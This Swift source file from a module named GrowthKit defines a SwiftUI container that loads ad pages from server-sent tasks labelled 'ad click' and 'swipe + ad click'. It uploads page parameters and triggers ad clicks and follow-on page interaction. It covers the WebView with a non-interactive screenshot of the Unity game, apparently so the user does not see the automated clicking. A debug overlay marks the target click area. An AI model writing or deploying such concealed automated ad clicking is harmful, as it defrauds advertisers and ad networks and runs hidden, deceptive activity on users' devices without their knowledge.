//
//  SingleLayerWebContainer.swift
//  GrowthKit
//
//  Created by arvin on 2025/6/11.
//

import SwiftUI

// MARK: - 单层广告点击容器（层级1）
/// 处理广告点击的WebView容器
/// 任务类型：广告点击、滑动+广告点击
internal struct SingleLayerWebContainer: View {
    @ObservedObject private var layerManager = LayerOrchestrator.shared
    @ObservedObject private var startManager = TaskLauncher.shared
    @ObservedObject private var viewModel = SingleLayerViewModel.shared
    
    @State private var hasReportedAds: Bool = false
    
    var body: some View {
        ZStack {
            // 当有任务时显示 WebView
            if let task = viewModel.currentTask, let link = task.link {
                SingleLayerGameWebView(link)
                    .onLoadFinish { coordinator in
                        print("[H5] [SingleLayerVM] ✅ 广告WebView加载完成: \(task.taskDescription)")
                        viewModel.handleWebViewLoaded(coordinator)
                        
                        // 使用后台线程处理网络请求
                        if !hasReportedAds {
                            DispatchQueue.global(qos: .userInitiated).async {
                                let json = H5UploadParam.refreshParams(link)
                                NetworkServer.uploadH5Params(json)
                                
                                // 在主线程更新状态
                                DispatchQueue.main.async {
                                    hasReportedAds = true
                                }
                            }
                        }
                    }
                    .onLoadIframe { coordinator in
                        print("[H5] [SingleLayerVM] ✅ 触发广告点击，进入二级页面交互: \(task.taskDescription)")
                        viewModel.handleAdIframeLoaded(coordinator)
                    }
                    .onLoadFail { error in
                        print("[H5] [SingleLayerVM] ❌ 广告WebView加载失败: \(task.taskDescription), error: \(error)")
                        viewModel.handleWebViewLoadFailed(error)
                    }
            }
#if DEBUG
            // 显示广告区域指示器
            if viewModel.showAdIndicator {
                if let ad = viewModel.bestMatchedAd, let area = ad.area {
                    AdAreaIndicator(area: area)
                }
            }
#endif
            // 显示 Unity 截图作为背景
            if let screenshot = viewModel.unityScreenshot {
                Image(uiImage: screenshot)
                    .resizable()
                    .aspectRatio(contentMode: .fill)
                    .allowsHitTesting(false)
                    .opacity(startManager.screenshotOpacity)
                    .onAppear {
                        print("[H5] [SingleLayerVM] 展示截图遮罩")
                    }
            }
        }
        .opacity(startManager.singleLayerOpacity)
        .onAppear {
            print("[H5] [SingleLayerVM] 🎬 单层WebView容器出现")
            viewModel.handleContainerAppear()
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                viewModel.startTaskProcess()
            }
        }
        .onDisappear {
            print("[H5] [SingleLayerVM] 👋 单层WebView容器消失")
            viewModel.handleContainerDisappear()
            hasReportedAds = false
        }
    }
    
}

// 广告区域可视化指示器
internal struct AdAreaIndicator: View {
    let area: AdArea
    
    var body: some View {
        GeometryReader { geometry in
            ZStack {
                // 获取WebView在屏幕中的位置
                // 使用立即执行闭包确保这个计算不会在视图构建过程中执行
                let webViewFrame = {
                    return geometry.frame(in: .global)
                }()
                
                // 获取调整后的位置（使用 AdArea 中的辅助方法）
                // 使用立即执行闭包确保这些计算不会在视图构建过程中执行
                let (adjustedTop, adjustedCenterY) = {
                    return (area.getAdjustedTop(), area.getAdjustedCenterY())
                }()
                
                // 获取安全区域高度（用于显示）
                let safeAreaTopInset: CGFloat = {
                    if #available(iOS 11.0, *) {
                        let keyWindow = UIApplication.shared.windows.first(where: { $0.isKeyWindow })
                        return keyWindow?.safeAreaInsets.top ?? 44
                    } else {
                        return UIApplication.shared.statusBarFrame.height
                    }
                }()
                
                // 打印调试信息（在视图外部）
                let _ = {
                    print("[H5] [AdAreaIndicator] 📐 原始top=\(area.top), 安全区顶部=\(safeAreaTopInset), 调整后top=\(adjustedTop)")
                }()
                
                // 广告区域边框 - 使用调整后的坐标
                Rectangle()
                    .stroke(Color.red, lineWidth: 2)
                    .background(Color.red.opacity(0.2))
                    .frame(width: area.width, height: area.height)
                    .position(x: area.left + area.width / 2, y: adjustedTop + area.height / 2)
                
                // 中心点指示器 - 使用调整后的坐标
                ZStack {
                    Circle()
                        .fill(Color.red)
                        .frame(width: 20, height: 20)
                    
                    Circle()
                        .stroke(Color.white, lineWidth: 2)
                        .frame(width: 20, height: 20)
                }
                .position(x: area.center.x, y: adjustedCenterY)
                
                // 屏幕中心点
                Circle()
                    .fill(Color.green)
                    .frame(width: 20, height: 20)
                
                // 广告类型标签
                VStack(alignment: .leading, spacing: 4) {
                    Text("点击区域")
                        .font(.system(size: 12, weight: .bold))
                    
                    Text("网页坐标: (\(Int(area.center.x)), \(Int(area.center.y)))")
                        .font(.system(size: 10))
                    
                    // 计算并显示屏幕坐标
                    let screenCenter = {
                        let center = area.toScreenCenter(in: webViewFrame)
                        print("[H5] [AdAreaIndicator] 📐 计算并显示屏幕坐标towebViewFramep=\(webViewFrame)，center=\(center)")
                        return center
                    }()
                    Text("屏幕坐标: (\(Int(screenCenter.x)), \(Int(screenCenter.y)))")
                        .font(.system(size: 10))
                    
                    // 显示安全区域信息
                    Text("安全区顶部: \(Int(safeAreaTopInset))")
                        .font(.system(size: 10))
                }
                .foregroundColor(.white)
                .padding(6)
                .background(Color.blue)
                .cornerRadius(4)
                .position(x: area.left + 70, y: adjustedTop - 20)
            }
        }
        .allowsHitTesting(false)
    }
    
}
